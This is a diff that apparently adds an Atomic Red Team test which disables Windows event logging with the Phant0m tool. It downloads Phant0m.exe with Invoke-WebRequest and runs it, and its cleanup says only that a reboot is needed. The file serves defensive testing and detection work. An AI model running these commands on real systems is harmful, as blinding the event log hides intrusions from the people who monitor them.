@@ -97,3 +97,29 @@ atomic_tests:
     cleanup_command: |
       wevtutil sl "#{log_name}" /e:true
     name: command_prompt
+- name: 'Makes Eventlog blind with Phant0m'
+  auto_generated_guid: 3ddf3d03-f5d6-462a-ad76-2c5ff7b6d741
+  description: |
+    Use [Phant0m](https://github.com/hlldz/Phant0m) to disable Eventlog
+  supported_platforms:
+  - windows
+  input_arguments:
+    file_name:
+      description: exe version of Phant0m
+      type: Path
+      default: PathToAtomicsFolder\T1562.002\bin\Phant0m.exe
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Phant0m.exe must exist on disk at specified location (#{file_name})
+    prereq_command: |
+      if (Test-Path #{file_name}) {exit 0} else {exit 1}
+    get_prereq_command: |
+      New-Item -Type Directory (split-path #{file_name}) -ErrorAction ignore | Out-Null
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1562.002/bin/Phant0m.exe" -OutFile "#{file_name}" -UseBasicParsing
+  executor:
+    command: |
+      PathToAtomicsFolder\T1562.002\bin\Phant0m.exe
+    cleanup_command: |
+      echo "Sorry you have to reboot"
+    name: command_prompt
